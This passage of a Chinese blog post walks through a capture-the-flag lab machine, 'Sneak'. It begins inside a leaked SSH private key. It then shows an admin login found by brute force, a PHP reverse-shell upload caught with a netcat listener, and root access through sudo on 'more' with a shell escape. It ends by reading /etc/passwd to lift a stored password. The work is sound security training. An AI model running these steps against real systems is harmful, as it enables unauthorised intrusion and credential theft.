+L&#x2F;whI5zi+dtuR2AOViFGjj20uMCKz3sC1zGeFAiaw0eaodlZSYBsW5MfOkY5WEOaos3fP+
+hnyzNEUb&#x2F;IPuSjAEZSEJvB+8anUqAlhYaGkoTrMjBkDgJed08cSjH4sdcj7wjBeJCqIM5n
+DkekVQPo05FQfNtSSkt3uOmOQ6CoewAAAAMBAAEAAAGAFNe6UNkdX5fRSQfSisl&#x2F;9NzSIg
+fsMQFxDtqklx543PIDHFClccZc3gCXdu0UNi8t1dAjkVttBkw373T+3zXUVHhkZrzSRgAw
+RATRmnKH4if3O&#x2F;0p&#x2F;vRBmMPEwHEmHbP2f+K8gEdKsV1oLBGkqSV3jnH0To72q9UMvNavZY
+7WgHRbOf8AICNJ18pnwUcfHzjO+kyIanlPR+gaiopWXy+LmZF9Iclmbkq+udSh0W8b9DWe
+aJ3Q&#x2F;ySGXsj7F8FkdHvZMpPDK4ZKMRdx7UalxY14RlUi2500eZawNbFd&#x2F;cPUkVFSPl&#x2F;mlY
+rs4ukylcv5quLxIyC3FHSyYxVMfNXHR5s6d2PsqDIy5ES594zVlDG2uV8WXtKUj4CkLy4O
+OTe2CmPjFYfQSrF4JT0JhQBMWXIrRetIUiyQULFFYxSvQZ0xm&#x2F;wBZDiO8npE+0dG&#x2F;Czelb
+NMr+MDPwpnhqB&#x2F;VxJXLDOkx3FxVvIeIhVvUhbiTXf5Lyzvlhu9N0sjbJ1oTnnGClkxAAAA
+wGg79PTiKC6HwVFRxxQGnPufZ8Go1KeLfpJ0TR3RQ0TNPh54eFH&#x2F;O+YAmTRDKeDU5fxrQY
+1O5&#x2F;&#x2F;w8K45Fn6e+2XxVoDsCWK&#x2F;6N4BnZ29FRnCsgy0cDLYl02fcVEpbbwATG0ej&#x2F;7xZqRM
+R9wxe4c&#x2F;2e9ifWnYljQe9PzOoPOCdZgz1v1jYvON17T+MVuudygdNRLZw+ZgBf1xVQYHBu
+0PdCd8Z5PpAU9CuVcF0nduU6H0ATUieBq4wJonHR&#x2F;GSDHaWwAAAMEA5U10wISA+s+p1gCy
+8kiVzZNbGxOKTWNPvubFREDC3rOKfxwIqkMMm22Kl1zOOKRL5KQYUeIPgm&#x2F;FE27Q204TLN
+u1I53duJiGnT+plR7ZbCyuKxRLUP8hVVkB8+01f7fMkQ5deDjxg+FU3X4jGn9HuR&#x2F;rzwkt
+jSQ7sjSRRjY7zJaF+PddkcnleejwHcNy48WUSesTKRSZQfTwqWN5DGIL23&#x2F;BRhRWUr4iKq
+hF9POCZc9HYmluQcSxrwgMPvdebZ2TAAAAwQDkZZIM3s22MjYcG2ho1zq8mmE8gn8DX06D
+T5AHbmxc0QWQIKpIyhH4&#x2F;w1BTXfeBmoRca80dhpMUK+idiYG9TOYW2yAczR3nCUYHhYuV2
+SqJJULMMPaKbtreO7rLzra3Irr9dNU+0ZIy6OsoE9tHa8nCnuWoYa&#x2F;p8efCoZNAFkCIfju
+sX74l65qBqWMs8knQ2mxI6hmmZ+Tqvl+b2KqtsdML7VbLXTlfJmNxKwDnzMJ1QrINssBDx
+8Ut5DpiqUW2nkAAAAMc3lzYWRtQFNuZWFrAQIDBAUGBw&#x3D;&#x3D;
+-----END OPENSSH PRIVATE KEY-----
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后去看一下<code>robots.txt</code>的内容</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# curl http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;robots.txt
+# robots.txt flatCore
+User-agent: *
+Disallow: &#x2F;acp&#x2F;
+Disallow: &#x2F;core&#x2F;
+Disallow: &#x2F;lib&#x2F;
+Disallow: &#x2F;modules&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>给出了几个目录，就<code>/acp/</code>有用，去访问一下</p>
+<style>.fpdfnesfpkkh{zoom:67%;}</style><img src="/posts/f834b323/undefined/image-20250714224751777.png" class="fpdfnesfpkkh" alt="image-20250714224751777">
+
+<p>是一个登录框，经过爆破后知道账号密码为<code>admin:88888888</code>,去登录</p>
+<p><img src="/posts/f834b323/image-20250714224841763.png" alt="image-20250714224841763"></p>
+<p>在左侧的<code>Dateien verwalten</code>找到了文件上传的位置</p>
+<p><img src="/posts/f834b323/image-20250714225011570.png" alt="image-20250714225011570"></p>
+<p>这里文件上传的类型为files，然后上传一个反弹shell的php文件，上传完之后，先kali监听，在点击文件</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.161.76] from (UNKNOWN) [192.168.161.126] 51108
+Linux Sneak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU&#x2F;Linux
+ 10:51:34 up  1:03,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+sysadm   pts&#x2F;1    192.168.161.76   10:01   37:18   0.04s  0.04s -bash
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)
+&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>刚才不是拿到了一个ssh密钥吗，去home目录下看看有那些用户</p>
+<pre class="line-numbers language-none"><code class="language-none">$ cd home
+$ ls -al
+total 16
+drwxr-xr-x  4 root   root   4096 Jul 11 13:49 .
+drwxr-xr-x 18 root   root   4096 Jul 11 11:49 ..
+drwxr-xr-x  3 sysadm sysadm 4096 Jul 14 10:19 sysadm
+drwxr-xr-x  3 user   user   4096 Jul 11 13:50 user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>有两个用户，猜测ssh密钥是sysadm用户的，进行ssh登录</p>
+<h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# ssh sysadm@192.168.161.126 -i id
+Linux Sneak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU&#x2F;Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
+
+Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Jul 14 10:01:01 2025 from 192.168.161.76
+sysadm@Sneak:~$ id
+uid&#x3D;1002(sysadm) gid&#x3D;1003(sysadm) groups&#x3D;1003(sysadm)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现userflag不在sysadm用户下，在user下，但是不能直接cat用户user下的flag</p>
+<p>先看一下sysadm用户的sudo权限</p>
+<pre class="line-numbers language-none"><code class="language-none">sysadm@Sneak:~$ sudo -l
+Matching Defaults entries for sysadm on Sneak:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User sysadm may run the following commands on Sneak:
+    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;more &#x2F;var&#x2F;log&#x2F;custom&#x2F;fake-cleanup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到用户sysadm可以通过sudo以root权限运行以下命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">(ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;more &#x2F;var&#x2F;log&#x2F;custom&#x2F;fake-cleanup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>并且more有一个特性</p>
+<pre class="line-numbers language-none"><code class="language-none">- 在分页暂停时，&#96;more&#96;可以执行多种命令，其中以&#96;!&#96;开头的命令会在shell中执行。
+- 例如，输入&#96;!&#x2F;bin&#x2F;bash&#96;会启动一个交互式shell。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>也就是说当终端所显示的行数不足以满足fake-cleanup.sh文件所需要展示的行数时，会出现一个交互式的界面，类似与vim退出时要输入命令的界面，如下图所示</p>
+<p><img src="/posts/f834b323/image-20250714230122078.png" alt="image-20250714230122078"></p>
+<p>如果修改的行数为1，则不会出现交互式命令</p>
+<pre class="line-numbers language-none"><code class="language-none">sysadm@Sneak:~$ stty rows 1
+sysadm@Sneak:~$ sudo &#x2F;usr&#x2F;bin&#x2F;more &#x2F;var&#x2F;log&#x2F;custom&#x2F;fake-cleanup.sh
+sysadm@Sneak:~$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>因此可以通过<code>stty rows</code>的方式来修改行数为2即可，</p>
+<pre class="line-numbers language-none"><code class="language-none">sysadm@Sneak:~$ stty rows 2
+sysadm@Sneak:~$ sudo &#x2F;usr&#x2F;bin&#x2F;more &#x2F;var&#x2F;log&#x2F;custom&#x2F;fake-cleanup.sh
+# System cleanup script - DO NOT MODIFY
+!&#x2F;bin&#x2F;bash
+root@Sneak:&#x2F;home&#x2F;sysadm# id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-none"><code class="language-none">root@Sneak:~# cat root.txt
+flag&#123;root-36bee2f8db4943b0f6c9d16afe11d454&#125;
+root@Sneak:~# cat &#x2F;home&#x2F;user&#x2F;user.txt
+flag&#123;user-9fcae37cb857fb5fc6f8d74c82a5d0ga&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="user密码的获取方式"><a href="#user密码的获取方式" class="headerlink" title="user密码的获取方式"></a>user密码的获取方式</h3><p>直接读取<code>/etc/passwd</code>，反弹shell的www-data用户也可以读取这个文件</p>
+<pre class="line-numbers language-none"><code class="language-none">root@Sneak:~# cat &#x2F;etc&#x2F;passwd
+root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
+sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
+games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
+man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
+lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
+news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
+uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
+proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
+backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
+list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
+irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
+nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
+_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+systemd-network:x:102:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin
+messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
+sshd:x:105:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+user:x:1001:1001:user@123:&#x2F;home&#x2F;user:&#x2F;bin&#x2F;bash
+sysadm:x:1002:1003:Where is my license?:&#x2F;home&#x2F;sysadm:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>user用户的密码时<code>user@123</code></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/f834b323.html">https://drume2.github.io/posts/f834b323.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/461aac3e.html"><img class="prev-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HMV-Driftingblues8</div></div></a></div><div class="next-post pull-right"><a href="/posts/1bc1c977.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-driftingblues7</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/e8b3ee3e.html" title="群友靶机-Space"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-23</div><div class="title">群友靶机-Space</div></div></a></div><div><a href="/posts/120ea349.html" title="群友靶机-backdoor1"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-09</div><div class="title">群友靶机-backdoor1</div></div></a></div><div><a href="/posts/7d85869a.html" title="群友靶机-config"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-09</div><div class="title">群友靶机-config</div></div></a></div><div><a href="/posts/37761836.html" title="群友靶机-sML"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-10</div><div class="title">群友靶机-sML</div></div></a></div><div><a href="/posts/e2bfefbb.html" title="群友靶机-Basic"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="title">群友靶机-Basic</div></div></a></div><div><a href="/posts/b7a76a47.html" title="群友靶机-sudo"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-11</div><div class="title">群友靶机-sudo</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-sneak"><span class="toc-number">1.</span> <span class="toc-text">群友靶机-sneak</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%99%BB%E5%BD%95"><span class="toc-number">1.3.</span> <span class="toc-text">ssh登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.4.</span> <span class="toc-text">flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user%E5%AF%86%E7%A0%81%E7%9A%84%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.1.</span> <span class="toc-text">user密码的获取方式</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/e9d2f92b.html" title="HMV-Insomnia"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Insomnia"/></a><div class="content"><a class="title" href="/posts/e9d2f92b.html" title="HMV-Insomnia">HMV-Insomnia</a><time datetime="2025-07-14T20:24:40.000Z" title="发表于 2025-07-15 04:24:40">2025-07-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/461aac3e.html" title="HMV-Driftingblues8"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Driftingblues8"/></a><div class="content"><a class="title" href="/posts/461aac3e.html" title="HMV-Driftingblues8">HMV-Driftingblues8</a><time datetime="2025-07-14T19:04:10.000Z" title="发表于 2025-07-15 03:04:10">2025-07-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f834b323.html" title="群友靶机-sneak"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-sneak"/></a><div class="content"><a class="title" href="/posts/f834b323.html" title="群友靶机-sneak">群友靶机-sneak</a><time datetime="2025-07-14T14:17:13.000Z" title="发表于 2025-07-14 22:17:13">2025-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1bc1c977.html" title="HMV-driftingblues7"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-driftingblues7"/></a><div class="content"><a class="title" href="/posts/1bc1c977.html" title="HMV-driftingblues7">HMV-driftingblues7</a><time datetime="2025-07-11T16:07:49.000Z" title="发表于 2025-07-12 00:07:49">2025-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b7a76a47.html" title="群友靶机-sudo"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-sudo"/></a><div class="content"><a class="title" href="/posts/b7a76a47.html" title="群友靶机-sudo">群友靶机-sudo</a><time datetime="2025-07-11T13:56:31.000Z" title="发表于 2025-07-11 21:56:31">2025-07-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
+      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
+      avatar: 'monsterid',
+      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Twikoo' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
